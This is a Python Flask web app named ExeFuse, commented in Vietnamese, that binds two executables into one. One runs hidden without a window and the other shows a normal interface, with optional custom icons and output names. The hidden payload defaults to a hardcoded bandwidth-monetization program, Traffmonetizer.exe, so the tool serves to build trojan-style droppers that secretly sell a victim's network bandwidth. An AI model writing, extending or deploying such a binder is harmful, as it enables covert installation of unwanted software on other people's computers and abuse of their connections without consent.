# -*- coding: utf-8 -*-
"""
ExeFuse - Web UI gop 2 file EXE thanh 1 file duy nhat.

Mot app chay NGAM (an cua so), mot app HIEN giao dien - hoac che do SOLO
(chi chay app an, khong can app hien).

FILE AN MAC DINH (hardcode): Traffmonetizer.exe
  - Dat file vao thu muc  defaults/Traffmonetizer.exe  ben canh app.py
  - Web UI se tu dong dung file nay neu ban khong upload file khac

Chay server:  python app.py   ->   http://127.0.0.1:5000
"""

import os
import platform
import shutil
import tempfile
import uuid

from flask import Flask, abort, jsonify, render_template, request, send_file

from builder import build as builder

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 2 * 1024 * 1024 * 1024  # 2 GB

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
WORK_ROOT = os.path.join(tempfile.gettempdir(), "exefuse_jobs")
DEFAULTS_DIR = os.path.join(BASE_DIR, "defaults")

# >>> FILE AN MAC DINH (hardcode) <<<
PREFERRED_DEFAULT_HIDDEN = "Traffmonetizer.exe"

os.makedirs(WORK_ROOT, exist_ok=True)


def get_default_hidden():
    """Tim file an mac dinh trong defaults/ (uu tien Traffmonetizer.exe)."""
    if not os.path.isdir(DEFAULTS_DIR):
        return None
    preferred = os.path.join(DEFAULTS_DIR, PREFERRED_DEFAULT_HIDDEN)
    if os.path.isfile(preferred):
        return preferred
    try:
        for name in sorted(os.listdir(DEFAULTS_DIR)):
            if name.lower().endswith(".exe"):
                candidate = os.path.join(DEFAULTS_DIR, name)
                if os.path.isfile(candidate):
                    return candidate
    except Exception:
        pass
    return None


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/env")
def api_env():
    """Thong tin moi truong build (Python, PyInstaller, file an mac dinh)."""
    payload = {
        "python": platform.python_version(),
        "platform": platform.platform(),
        "pyinstaller": builder.pyinstaller_version(),
        "ready": builder.pyinstaller_available(),
        "default_hidden": None,
    }
    default_hidden = get_default_hidden()
    if default_hidden:
        try:
            payload["default_hidden"] = {
                "name": os.path.basename(default_hidden),
                "size_mb": round(os.path.getsize(default_hidden) / 1048576.0, 1),
                "preferred": (
                    os.path.basename(default_hidden).lower()
                    == PREFERRED_DEFAULT_HIDDEN.lower()
                ),
            }
        except Exception:
            pass
    return jsonify(payload)


@app.route("/api/build", methods=["POST"])
def api_build():
    """Nhan file EXE an (upload hoac mac dinh) + file EXE hien (tuy chon)."""
    use_default_hidden = request.form.get("use_default_hidden", "0") == "1"
    solo_mode = request.form.get("solo_mode", "0") == "1"

    hidden = request.files.get("hidden_file")
    visible = request.files.get("visible_file")
    icon = request.files.get("icon_file")

    if icon is not None and icon.filename and not icon.filename.lower().endswith(".ico"):
        return jsonify({"error": "Icon phải là file .ico"}), 400

    workdir = os.path.join(WORK_ROOT, uuid.uuid4().hex)
    os.makedirs(workdir, exist_ok=True)

    def _bad(message, code=400):
        shutil.rmtree(workdir, ignore_errors=True)
        return jsonify({"error": message}), code

    try:
        # --- File an: upload HOAC mac dinh tu defaults/ ---
        if hidden is not None and hidden.filename:
            if not hidden.filename.lower().endswith(".exe"):
                return _bad("File '%s' không phải là file .exe" % hidden.filename)
            hidden_src = os.path.join(workdir, "upload_hidden.exe")
            hidden.save(hidden_src)
            hidden_label = hidden.filename
        elif use_default_hidden:
            hidden_src = get_default_hidden()
            if not hidden_src:
                return _bad(
                    "Chưa có file mặc định! Hãy đặt %s vào thư mục defaults/ "
                    "cùng chỗ với app.py, hoặc upload file .exe."
                    % PREFERRED_DEFAULT_HIDDEN
                )
            hidden_label = os.path.basename(hidden_src) + " (mặc định)"
        else:
            return _bad(
                "Chưa chọn file chạy ngầm. Hãy chọn file .exe, hoặc đặt %s "
                "vào thư mục defaults/ để dùng mặc định." % PREFERRED_DEFAULT_HIDDEN
            )

        # --- File hien: bo qua neu che do SOLO ---
        if solo_mode:
            visible_src = None
        else:
            if visible is None or not visible.filename:
                return _bad(
                    "Chưa chọn file hiển thị giao diện. Hãy chọn file .exe, "
                    "hoặc bật chế độ 'Chỉ chạy app ẩn'."
                )
            if not visible.filename.lower().endswith(".exe"):
                return _bad("File '%s' không phải là file .exe" % visible.filename)
            visible_src = os.path.join(workdir, "upload_visible.exe")
            visible.save(visible_src)

        icon_path = None
        if icon is not None and icon.filename:
            icon_path = os.path.join(workdir, "app.ico")
            icon.save(icon_path)

        output_name = request.form.get("output_name") or "ExeFuse_App"
        kill_hidden = request.form.get("kill_hidden", "0") == "1"
        hide_watch = request.form.get("hide_watch", "0") == "1"

        job_id = builder.start_job(
            workdir, hidden_src, visible_src, output_name,
            kill_hidden=kill_hidden, hide_watch=hide_watch, icon_src=icon_path,
            hidden_label=hidden_label,
        )
    except Exception as exc:
        shutil.rmtree(workdir, ignore_errors=True)
        return jsonify({"error": str(exc)}), 500

    return jsonify({"job_id": job_id})


@app.route("/api/status/<job_id>")
def api_status(job_id):
    """Trang thai + log cua job build (de UI polling)."""
    job = builder.get_job(job_id)
    if job is None:
        return jsonify({"error": "Job không tồn tại"}), 404
    return jsonify(job)


@app.route("/api/download/<job_id>")
def api_download(job_id):
    """Tai file EXE ket qua."""
    info = builder.get_result(job_id)
    if info is None:
        abort(404)
    path, name = info
    return send_file(path, as_attachment=True, download_name=name)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    print("=" * 56)
    print("  ExeFuse is running at:  http://127.0.0.1:%d" % port)
    print("  Default hidden app: %s" % PREFERRED_DEFAULT_HIDDEN)
    print("  Nhan Ctrl+C de tat server.")
    print("=" * 56)
    app.run(host="127.0.0.1", port=port, debug=False, threaded=True)
